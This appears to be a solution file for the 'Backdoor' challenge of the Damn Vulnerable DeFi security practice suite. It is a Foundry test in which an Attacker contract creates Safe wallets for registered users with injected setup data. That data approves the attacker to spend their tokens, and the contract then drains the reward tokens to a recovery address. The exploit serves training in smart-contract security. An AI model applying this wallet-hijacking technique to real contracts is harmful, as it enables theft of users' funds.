// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        new Attacker(
            address(walletFactory),
            address(singletonCopy),
            address(walletRegistry),
            address(token),
            recovery,
            users
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

// Safe call this
contract Initializer {
    function approveTokens(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}

contract Attacker {
    constructor(
        address _walletFactory,
        address _singletonCopy,
        address _walletRegistry,
        address _token,
        address _recovery,
        address[] memory users
    ) {
        Initializer init = new Initializer();

        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            // Encode the `approveTokens` call
            bytes memory setupData = abi.encodeWithSelector(
                init.approveTokens.selector,
                _token,
                address(this)
            );

            // Encode Safe.setup() with the `to`/`data` fields inject our approveTokens call
            bytes memory initData = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,          // owners
                1,               // threshold
                address(init), // to: called during setup
                setupData,       // data: approves this contract to spend wallet tokens
                address(0),      // fallbackHandler
                address(0),      // paymentToken
                0,               // payment
                address(0)       // paymentReceiver
            );

            // Deploy the proxy: WalletRegistry.proxyCreated() callback sends 10 DVT to the wallet
            address proxy = address(
                SafeProxyFactory(_walletFactory).createProxyWithCallback(
                    _singletonCopy,
                    initData,
                    i, // saltNonce: unique per user
                    IProxyCreationCallback(_walletRegistry)
                )
            );

            // Drain the 10 DVT that the registry just sent to the wallet loop 4x = 40 DVT
            IERC20(_token).transferFrom(proxy, _recovery, IERC20(_token).balanceOf(proxy));
        }
    }
}
